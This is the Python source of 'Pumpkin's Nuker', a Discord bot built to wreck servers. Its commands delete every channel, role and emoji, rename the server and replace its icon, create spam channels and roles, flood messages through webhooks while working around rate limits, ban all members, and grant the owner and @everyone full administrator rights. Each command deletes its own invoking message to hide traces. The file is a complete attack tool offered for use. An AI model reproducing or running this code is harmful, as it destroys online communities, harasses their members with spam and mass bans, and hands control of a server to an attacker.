import discord
from discord.ext import commands
import json
import random
import aiohttp
import asyncio
import os
import itertools
from discord import Permissions
from discord.ext import commands
from design.colors import *
from design.banner import banner



with open('config.json', 'r') as file:
    config = json.load(file)
  
  

        

TOKEN = config['token']
GUILD_IDS = config['guild_ids']
ADMIN_ROLE_NAME = config['admin_role_name']
SPAM_ROLES_NAME = config['spam_roles_name']
OWNER_ID = config['owner_id']
NUM_CHANNELS = config['num_channels']
NUM_ROLES = config['num_roles']




intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

import asyncio

    

@bot.event
async def on_ready():
    print(Style.BRIGHT + Fore.LIGHTYELLOW_EX, "\n\n\t\tPreparing Nuker...", Style.RESET_ALL)
    await asyncio.sleep(2)
    print(Style.BRIGHT + Fore.LIGHTYELLOW_EX, "\n\n\t\tDone...", Style.RESET_ALL)
    await asyncio.sleep(1)
    banner()
    print("\n", Style.BRIGHT + Fore.RED + "|" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTCYAN_EX, "- " * 4, f"Logged in as {bot.user}", "- " * 4 + Style.RESET_ALL, Style.BRIGHT + Fore.RED + "|" + Style.RESET_ALL)
    print("\n", Style.BRIGHT + Fore.LIGHTRED_EX + "[+]" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTYELLOW_EX, f"Prefix: {bot.command_prefix}" + Style.RESET_ALL)
    print("\n", Style.BRIGHT + Fore.LIGHTRED_EX + "[+]" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTYELLOW_EX, f"Total servers: {len(bot.guilds)}" + Style.RESET_ALL)
    print("\n", Style.BRIGHT + Fore.LIGHTRED_EX + "↓" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTGREEN_EX, "Connected Servers: " + Style.RESET_ALL)
    for guild in bot.guilds:
        print("\n", Style.BRIGHT + Fore.LIGHTRED_EX + ">" + Style.RESET_ALL, Style.BRIGHT + Fore.LIGHTYELLOW_EX, guild.name + Style.RESET_ALL)
        

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)



@bot.command(name="1")
@is_owner()
async def nuke(ctx):
    try:
        
        await ctx.message.delete()

        for guild_id in GUILD_IDS:
            guild = bot.get_guild(guild_id)
            
            if guild is None:
                print(Fore.RED + '✗' + Style.RESET_ALL, f'Failed to find guild with ID {guild_id}')
                continue
        try:
                await guild.edit(name=config['new_guild_name'])
                with open(config['new_guild_icon'], 'rb') as f:
                    await guild.edit(icon=f.read())
                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Changed guild name and icon in {guild.name}')
                
                deleted_channels = []
                deleted_roles = []
                
                
                await delete_roles(guild, deleted_roles)
                await delete_channels(guild, deleted_channels)
                

                tasks = [
                    spam_channels(guild, NUM_CHANNELS, deleted_channels),
                    spam_roles(guild, NUM_ROLES, deleted_roles)
                ]
                
                await asyncio.gather(*tasks)
                
                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted text channels in {guild.name}: {deleted_channels}')
                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted roles in {guild.name}: {deleted_roles}')
                
        except Exception as e:
                print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in guild {guild.name}: {e}')
        
        print(Fore.GREEN + '✓' + Style.RESET_ALL, 'All actions completed')
    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in nuke command: {e}')
      

async def delete_roles(guild, deleted_roles):
    try:
        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleting roles in {guild.name}')
        for role in guild.roles:
            if role != guild.default_role:
                await role.delete()
                deleted_roles.append(role.name)
                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted role: {role.name}')
        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'All roles deleted in {guild.name}')
    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error deleting roles in {guild.name}: {e}')

async def delete_channels(guild, deleted_channels):
    try:
        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleting channels in {guild.name}')
        for channel in guild.channels:
            await channel.delete()
            if isinstance(channel, discord.TextChannel):
                deleted_channels.append(channel.name)
                print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Deleted channel: {channel.name}')
        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'All channels deleted in {guild.name}')
    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error deleting channels in {guild.name}: {e}')

async def spam_channels(guild, num_channels, deleted_channels):
    try:
        channel_names = [config['spam_channels_name_1'], config['spam_channels_name_2']]
        webhook_names = config['webhook_names']
        webhook_list = []

        for _ in range(num_channels):
            channel_name = random.choice(channel_names)
            channel = await guild.create_text_channel(name=channel_name)
            deleted_channels.append(channel.name)
            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Spam text channel created in {guild.name}: {channel.name}')

            webhook = await channel.create_webhook(name=random.choice(webhook_names))
            webhook_list.append(webhook)
            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Webhook created in {guild.name} - Channel: {channel.name}, Webhook: {webhook.name}')

        await spam(webhook_list)  # Pass the webhook list to the spam function

    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error creating spam text channels and webhooks in {guild.name}: {e}')
        
        
async def spam(webhook_list):
    try:
        with open('config.json', 'r') as file:
            config = json.load(file)

        messages_per_channel = config['messages_per_channel']
        rest_time = config['rest_time']
        message_content = config['message_content']

        print(Fore.GREEN + '✓' + Style.RESET_ALL, "Spamming process started.")

        try:
            async with aiohttp.ClientSession() as session:
                for _ in range(20):
                    for _ in range(messages_per_channel):
                        embed = discord.Embed(
                            title='Spam',
                            description=message_content
                        )
                        tasks = []
                        for webhook in webhook_list:
                            tasks.append(webhook.send(content=message_content, embed=embed))

                        while True:
                            try:
                                await asyncio.gather(*tasks)
                                break
                            except aiohttp.ClientResponseError as e:
                                if e.status == 429:
                                    print(Fore.RED + '✗' + Style.RESET_ALL, "Rate limited! Retrying...")
                                    retry_after = int(e.headers.get('Retry-After', '1'))
                                    await asyncio.sleep(retry_after + 1)
                                    print(Fore.GREEN + '✓' + Style.RESET_ALL, "Continuing spamming...")
                                else:
                                    print(Fore.RED + '✗' + Style.RESET_ALL, "Error sending webhook message:", e)
                                    raise

                        await asyncio.sleep(rest_time)

                for webhook in webhook_list:
                    await webhook.delete()

        except aiohttp.ClientError as e:
            print(Fore.RED + '✗' + Style.RESET_ALL, f"Error sending webhook message: {e}")

    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in spam command: {e}')
        
      


async def spam_roles(guild, num_roles, deleted_roles):
    try:
        for _ in range(num_roles):
            role_name = config['spam_roles_name']
            role = await guild.create_role(name=role_name)
            deleted_roles.append(role.name)
            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Spam role created in {guild.name}: {role.name}')
    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error creating spam roles in {guild.name}: {e}')



@bot.command(name="6")
@is_owner()
@commands.has_permissions(manage_roles=True)
async def adminall(ctx):
    await ctx.message.delete()
    role = ctx.guild.default_role
    permissions = discord.Permissions.all()
    try:
        await role.edit(permissions=permissions)
        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'All permissions granted to @everyone')
    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'error granting permission to @everyone')


@bot.command(name="5")
@is_owner()
async def emojidelete(ctx):
  await ctx.message.delete()
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(Fore.GREEN + '✓' + Style.RESET_ALL, f"successfully deleted emoji {emoji.name}!")
    except Exception as e:
      print(Fore.RED + '✗' + Style.RESET_ALL, f"error deleting emoji {emoji.name}!: {e}")
            

@bot.command(name="4")
@is_owner()
async def getadmin(ctx):
    try:
        guild = ctx.guild

        admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
        if admin_role is None:
            admin_role = await guild.create_role(name=ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Admin role created in {guild.name}')

        owner = guild.get_member(OWNER_ID)
        await owner.add_roles(admin_role)
        print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Admin role given to bot owner in {guild.name}')

        try:
            await ctx.message.delete()
        except discord.NotFound:
            print(Fore.RED + '✗' + Style.RESET_ALL, "Command message not found.")

    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error in admin command: {e}')
        
       
@bot.command(name="2")
@is_owner()
async def banall(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild

        members = []
        async for member in guild.fetch_members(limit=None):
            members.append(member)

        for member in members:
            if member == guild.me or member == guild.owner or member.id == OWNER_ID:
                continue

            await guild.ban(member)
            print(Fore.GREEN + '✓' + Style.RESET_ALL, f'Banned member: {member.name}')

        print(Fore.GREEN + '✓' + Style.RESET_ALL, "Banning process completed.")
    except Exception as e:
        print(Fore.RED + '✗' + Style.RESET_ALL, f'Error banning people in {guild.name}: {e}')


@bot.command()
@is_owner()
async def cmd(ctx):
    embed = discord.Embed(title="Pumpkin's Nuker", description='List of available commands:', color=discord.Color.blue())

    embed.add_field(name='!1', value="change server's name, icon, delete channels, delete roles, create channels, create roles, spam messages ", inline=False)
    embed.add_field(name="!2", value="ban members", inline=False)
    embed.add_field(name="!3", value="spam messages", inline=False)
    embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
    embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
    embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
  
    await ctx.author.send(embed=embed)

    
bot.run(TOKEN)
  